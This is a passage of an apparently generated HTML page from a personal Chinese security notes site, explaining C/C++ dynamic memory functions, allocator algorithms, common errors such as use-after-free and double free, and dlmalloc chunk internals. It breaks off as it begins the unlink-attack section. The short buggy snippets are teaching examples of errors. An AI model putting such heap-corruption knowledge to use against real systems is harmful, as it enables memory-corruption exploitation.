+      <a href="../408-helper/data-structure/stack.html" class="md-nav__link">
+        栈
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/data-structure/queue.html" class="md-nav__link">
+        队列
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/data-structure/array.html" class="md-nav__link">
+        数组
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/data-structure/string.html" class="md-nav__link">
+        字符串
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/data-structure/tree.html" class="md-nav__link">
+        树
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/data-structure/graph.html" class="md-nav__link">
+        图
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/data-structure/searching.html" class="md-nav__link">
+        查找
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/data-structure/sorting.html" class="md-nav__link">
+        排序
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle="__nav_5_5" type="checkbox" id="__nav_5_5" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../408-helper/computer-network/index.html">计算机网络</a>
+          
+            <label for="__nav_5_5">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="计算机网络" data-md-level="2">
+        <label class="md-nav__title" for="__nav_5_5">
+          <span class="md-nav__icon md-icon"></span>
+          计算机网络
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/computer-network/network-layer.html" class="md-nav__link">
+        网络层
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/computer-network/physical-layer.html" class="md-nav__link">
+        物理层
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+      
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" data-md-toggle="__nav_5_6" type="checkbox" id="__nav_5_6" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../408-helper/operating-system/index.html">操作系统</a>
+          
+            <label for="__nav_5_6">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="操作系统" data-md-level="2">
+        <label class="md-nav__title" for="__nav_5_6">
+          <span class="md-nav__icon md-icon"></span>
+          操作系统
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/operating-system/process.html" class="md-nav__link">
+        进程管理
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/operating-system/memory.html" class="md-nav__link">
+        内存管理
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/operating-system/file.html" class="md-nav__link">
+        文件管理
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../408-helper/operating-system/io.html" class="md-nav__link">
+        输入输出(I/O)管理
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tags.html" class="md-nav__link">
+        按标签查找
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+
+                
+  <a href="https://github.com/jasonren0403/notes/edit/main/notes_dev/soft_security/memory-management.md" title="编辑此页" class="md-content__button md-icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+  
+
+  <nav class="md-tags" >
+    
+      
+        <a href="../tags.html#" class="md-tag">
+          软件安全
+        </a>
+      
+    
+  </nav>
+
+
+
+<h1 id="_1">动态内存管理<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="_2">动态内存管理函数<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">C标准</label><label for="__tabbed_1_2">C++标准</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="tabbed-set tabbed-alternate" data-tabs="2:4"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><input id="__tabbed_2_3" name="__tabbed_2" type="radio" /><input id="__tabbed_2_4" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1"><code>malloc</code></label><label for="__tabbed_2_2"><code>realloc</code></label><label for="__tabbed_2_3"><code>calloc</code></label><label for="__tabbed_2_4"><code>free</code></label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<ul>
+<li><code>malloc(size_t size)</code>：分配给定大小内存，返回一个指向该内存的指针。<ul>
+<li>此内存没有被初始化！</li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="tabbed-block">
+<ul>
+<li><code>realloc(void *p, size_t size)</code>：把p所指向的内存块大小调整为size个字节<ul>
+<li>size=0 等价于<code>free(p)</code></li>
+<li>p是空指针 等价于<code>malloc(size)</code></li>
+<li>新分配的内存未做初始化</li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="tabbed-block">
+<ul>
+<li><code>calloc(size_t nmemb, size_t size)</code>：为数组分配内存，该数组共有<code>nmemb</code>个元素，每个元素的大小为<code>size</code>个字节<ul>
+<li>所分配的内存的内容全部设为0</li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="tabbed-block">
+<ul>
+<li><code>free(void *p)</code>释放<ul>
+<li>重复调用<code>free(p)</code>会导致未定义行为</li>
+<li>如果p是空指针，则不执行任何操作</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="tabbed-block">
+<p><code>new</code> 和 <code>delete</code></p>
+</div>
+</div>
+</div>
+<h2 id="_3">内存管理器<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<ul>
+<li>分配算法：<!--link to os/memory/分区分配算法--><ol>
+<li>连续匹配（匹配的第一个）</li>
+<li><a href="../408-helper/operating-system/memory.html#_5">最先匹配</a>（从内存开始位置寻找第一个空闲区域）</li>
+<li>最佳匹配<ul>
+<li>有m个字节的区域被选中，其中m是（或其中一个）可用的最小的等于或大于n个字节的连续存储的块</li>
+</ul>
+</li>
+<li>最优匹配（选择遇到的第一个比样本更合适的块——最优结婚策略<sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup>）</li>
+<li>最差匹配（匹配最大的空闲块）</li>
+<li>伙伴系统<ul>
+<li>只以2的幂数次大小为单位分配空间，方便合并和拆分</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>内存管理器都做些什么<ul>
+<li>返回已释放的块到池中</li>
+<li>合并临近空闲块为更大的块</li>
+<li>有时使用压缩的预留块</li>
+<li>把所有块移到一起</li>
+<li>既管理已分配的内存，也管理已释放的内存</li>
+</ul>
+</li>
+<li>关于内存管理器<ul>
+<li>作为客户进程的一部分运行</li>
+<li>使用Knuth描述的动态存储分配算法的某个变种</li>
+<li>分配给客户进程的内存，以及供内部使用而分配的内存，全部位于客户进程的可寻址内存空间内</li>
+</ul>
+</li>
+</ul>
+<h3 id="_4">常见内存管理错误<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>初始化错误</p>
+<ul>
+<li>不要假设<code>malloc()</code>把分配的内存的所有位初始化为零</li>
+</ul>
+<div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><a href="#__codelineno-0-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="cm">/* return y = Ax */</span><span class="w"></span>
+<a id="__codelineno-0-2" name="__codelineno-0-2"></a><a href="#__codelineno-0-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="kt">int</span><span class="o">*</span><span class="w"> </span><span class="nf">matvec</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="o">**</span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">x</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-0-3" name="__codelineno-0-3"></a><a href="#__codelineno-0-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-0-4" name="__codelineno-0-4"></a><a href="#__codelineno-0-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-0-5" name="__codelineno-0-5"></a><a href="#__codelineno-0-5"><span class="linenos" data-linenos=" 5 "></span></a>
+<a id="__codelineno-0-6" name="__codelineno-0-6"></a><a href="#__codelineno-0-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-0-7" name="__codelineno-0-7"></a><a href="#__codelineno-0-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="hll"><a href="#__codelineno-0-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">        </span><span class="n">y</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">x</span><span class="p">[</span><span class="n">j</span><span class="p">];</span><span class="w">  </span><span class="c1">// (1)</span>
+</span><a id="__codelineno-0-9" name="__codelineno-0-9"></a><a href="#__codelineno-0-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">y</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-0-10" name="__codelineno-0-10"></a><a href="#__codelineno-0-10"><span class="linenos" data-linenos="10 "></span></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ol>
+<li><code>y[i]</code>是<code>0</code>吗？</li>
+</ol>
+<div class="admonition success">
+<p class="admonition-title">解决方案</p>
+<p>使用 <code>memset()</code>或<code>calloc()</code>替代<code>malloc()</code></p>
+</div>
+</li>
+<li>
+<p>未检查返回值</p>
+<ul>
+<li>内存分配失败：<code>malloc</code>返回空指针，<code>new</code>抛出<code>bad_alloc</code>异常</li>
+</ul>
+<div class="tabbed-set tabbed-alternate" data-tabs="3:2"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio" /><input id="__tabbed_3_2" name="__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="__tabbed_3_1">malloc检查返回值</label><label for="__tabbed_3_2">new异常处理</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><a href="#__codelineno-1-1"><span class="linenos" data-linenos="1 "></span></a><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">i_ptr</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-1-2" name="__codelineno-1-2"></a><a href="#__codelineno-1-2"><span class="linenos" data-linenos="2 "></span></a><span class="n">i_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="n">nelements_wanted</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="hll"><a href="#__codelineno-1-3"><span class="linenos" data-linenos="3 "></span></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">i_ptr</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+</span><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="hll"><a href="#__codelineno-1-4"><span class="linenos" data-linenos="4 "></span></a><span class="w">    </span><span class="n">i_ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"></span>
+</span><a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="hll"><a href="#__codelineno-1-5"><span class="linenos" data-linenos="5 "></span></a><span class="p">}</span><span class="k">else</span><span class="p">{</span><span class="w"></span>
+</span><a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="hll"><a href="#__codelineno-1-6"><span class="linenos" data-linenos="6 "></span></a><span class="cm">/* Couldn&#39;t get the memory - recover */</span><span class="w"></span>
+</span><a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="hll"><a href="#__codelineno-1-7"><span class="linenos" data-linenos="7 "></span></a><span class="p">}</span><span class="w"></span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="tabbed-set tabbed-alternate" data-tabs="4:2"><input checked="checked" id="__tabbed_4_1" name="__tabbed_4" type="radio" /><input id="__tabbed_4_2" name="__tabbed_4" type="radio" /><div class="tabbed-labels"><label for="__tabbed_4_1">try-catch</label><label for="__tabbed_4_2"><code>std:nothrow</code></label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><span class="filename">C++</span><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="hll"><a href="#__codelineno-2-1"><span class="linenos" data-linenos="1 "></span></a><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+</span><a id="__codelineno-2-2" name="__codelineno-2-2"></a><a href="#__codelineno-2-2"><span class="linenos" data-linenos="2 "></span></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">pn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-2-3" name="__codelineno-2-3"></a><a href="#__codelineno-2-3"><span class="linenos" data-linenos="3 "></span></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">pi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-2-4" name="__codelineno-2-4"></a><a href="#__codelineno-2-4"><span class="linenos" data-linenos="4 "></span></a><span class="w">    </span><span class="kt">double</span><span class="w"> </span><span class="o">*</span><span class="n">pd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">double</span><span class="p">(</span><span class="mf">55.9</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-2-5" name="__codelineno-2-5"></a><a href="#__codelineno-2-5"><span class="linenos" data-linenos="5 "></span></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">int</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span><span class="w"></span>
+<a id="__codelineno-2-6" name="__codelineno-2-6"></a><a href="#__codelineno-2-6"><span class="linenos" data-linenos="6 "></span></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="hll"><a href="#__codelineno-2-7"><span class="linenos" data-linenos="7 "></span></a><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">bad_alloc</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+</span><a id="__codelineno-2-8" name="__codelineno-2-8"></a><a href="#__codelineno-2-8"><span class="linenos" data-linenos="8 "></span></a><span class="w">     </span><span class="c1">// handle failure from new</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9"></a><a href="#__codelineno-2-9"><span class="linenos" data-linenos="9 "></span></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<ul>
+<li>在内存不足时，<code>new (std::nothrow)</code>并不抛出异常，而是将指针置<code>NULL</code></li>
+</ul>
+<div class="highlight"><span class="filename">C++</span><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="hll"><a href="#__codelineno-3-1"><span class="linenos" data-linenos="1 "></span></a><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="n">pn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">nothrow</span><span class="p">)</span><span class="w"> </span><span class="kt">int</span><span class="p">;</span><span class="w"></span>
+</span><a id="__codelineno-3-2" name="__codelineno-3-2"></a><a href="#__codelineno-3-2"><span class="linenos" data-linenos="2 "></span></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pn</span><span class="p">)</span><span class="w"> </span><span class="p">{...}</span><span class="w"></span>
+<a id="__codelineno-3-3" name="__codelineno-3-3"></a><a href="#__codelineno-3-3"><span class="linenos" data-linenos="3 "></span></a><span class="k">else</span><span class="w">  </span><span class="p">{...}</span><span class="w"></span>
+</code></pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</li>
+<li>
+<p>引用已释放内存</p>
+<ul>
+<li>不可能导致运行时错误<ul>
+<li>因为内存由内存管理器所有</li>
+</ul>
+</li>
+<li>已释放的内存在读操作之前可被分配<ul>
+<li>读操作读取的数值不正确</li>
+<li>写操作损坏其他变量</li>
+</ul>
+</li>
+<li>已释放内存能被内存管理器使用<ul>
+<li>写操作能损坏内存管理器元数据</li>
+<li>很难诊断运行时错误</li>
+<li>漏洞利用的基础</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">head</span><span class="p">;</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span><span class="w">    </span><span class="c1">// (1)</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">head</span><span class="p">;</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">q</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">    </span><span class="n">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span><span class="w">   </span><span class="c1">// (2)</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ol>
+<li>wrong</li>
+<li>ok - temp variable used</li>
+</ol>
+</li>
+<li>
+<p>多次释放内存</p>
+<ul>
+<li>复制粘贴时忘记修改相应的<code>free</code>代码
+<div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="cm">/* manipulate x */</span><span class="w"></span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">free</span><span class="p">(</span><span class="n">x</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="cm">/* manipulate y */</span><span class="w"></span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="hll"><span class="n">free</span><span class="p">(</span><span class="n">x</span><span class="p">);</span><span class="w">    </span><span class="c1">//oops...</span>
+</span></code></pre></div></li>
+<li>数据结构包含指向同一项的链接
+    <figure markdown>
+    <img alt="pointer points the same structure" src="md-img/20191021_01.png" />
+    </figure><ul>
+<li>类似于<code>free(a-&gt;stru); free(b-&gt;stru);</code></li>
+</ul>
+</li>
+<li>作为错误处理的结果，内存块被释放，但在正常处理过程中再次被释放</li>
+</ul>
+</li>
+<li>不正确配对内存管理函数<ul>
+<li>虽然有时也可以工作，但是降低了可移植性</li>
+<li>永远使用：<code>new</code> ~ <code>delete</code>  <code>malloc</code> ~ <code>free</code></li>
+</ul>
+</li>
+<li>分配函数的不当使用<ul>
+<li><code>malloc(0)</code>：可能返回空指针或伪地址</li>
+<li><code>alloca()</code><ul>
+<li>栈上分配内存，返回时自动释放</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>未能区分标量和数组（C++）<ul>
+<li><code>new</code>，<code>delete</code> 标量</li>
+<li><code>new[]</code>，<code>delete[]</code> 数组</li>
+</ul>
+</li>
+</ol>
+<h3 id="dlmalloc">dlmalloc<a class="headerlink" href="#dlmalloc" title="Permanent link">&para;</a></h3>
+<figure>
+<p><img alt="chunks" src="md-img/20191021_02.png" /></p>
+<figcaption>dlmalloc是大部分Linux版本默认内存分配器</figcaption>
+</figure>
+<ul>
+<li>
+<p>chunk的数据结构</p>
+<div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">struct</span><span class="w"> </span><span class="nc">malloc_chunk</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">  </span><span class="n">INTERNAL_SIZE_T</span><span class="w">      </span><span class="n">mchunk_prev_size</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">  </span><span class="n">INTERNAL_SIZE_T</span><span class="w">      </span><span class="n">mchunk_size</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">malloc_chunk</span><span class="o">*</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">malloc_chunk</span><span class="o">*</span><span class="w"> </span><span class="n">bk</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">malloc_chunk</span><span class="o">*</span><span class="w"> </span><span class="n">fd_nextsize</span><span class="p">;</span><span class="w"> </span><span class="cm">/* (1) */</span><span class="w"></span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">malloc_chunk</span><span class="o">*</span><span class="w"> </span><span class="n">bk_nextsize</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="p">};</span><span class="w"></span>
+</code></pre></div>
+<ol>
+<li>double links -- used only if free.</li>
+</ol>
+</li>
+<li>
+<p>空闲块</p>
+<ul>
+<li>以双链表形式组织起来</li>
+<li>包含指向下一块的前向指针和指向上一块的后向指针</li>
+<li>最后4字节存有该块的大小</li>
+</ul>
+</li>
+<li>已分配块和空闲块都使用一个PREV_INUSE位区分<ul>
+<li>块大小总是偶数，PREV_INUSE位被存储于块大小的低位中</li>
+</ul>
+</li>
+<li>空闲块被组织成筐
+<img alt="chunks2" src="md-img/20191021_03.png" /><ul>
+<li>由头索引</li>
+<li>筐中的块大约同样大小</li>
+<li>还有一个包含最近释放的块的筐作为缓存</li>
+</ul>
+</li>
+<li><code>free()</code>时<ul>
+<li>被释放的上一块是空的：合并</li>
+<li>被释放的下一块是空的：从双链表中解开，并合并</li>
+</ul>
+</li>
+</ul>
+<h3 id="unlink">unlink技术 → 解链攻击<a class="headerlink" href="#unlink" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>unlink宏
+    <div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="cp">#define unlink(P, BK, FD) { \</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="cp">    FD = P-&gt;fd; \</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="cp">    BK = P-&gt;bk; \</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="cp">    FD-&gt;bk = BK;    \</span>
